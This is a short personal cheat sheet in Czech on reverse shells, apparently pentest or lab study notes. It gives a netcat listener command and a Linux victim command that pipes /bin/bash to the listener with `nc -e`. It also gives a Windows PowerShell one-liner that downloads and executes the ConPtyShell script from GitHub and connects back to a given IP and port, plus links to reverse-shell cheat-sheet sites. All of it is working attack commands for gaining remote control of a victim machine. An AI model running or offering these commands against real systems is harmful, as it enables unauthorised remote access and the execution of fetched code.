---
date: 2026-01-19T20:24
cssclasses:
---

## listener
linux - `nc -lnvp 87 -s localhostIP` - listener na reverse shell
localhostIP vyměnit

## victim
https://www.revshells.com/
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary
### linux
`nc -e /bin/bash localhostIPlistenera portListenera`
-e prej nemusí fungovat ale mělo by to jet bez něj

### windows
```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell IP port
```
## flags
-p port
-s source - na čem poslouchá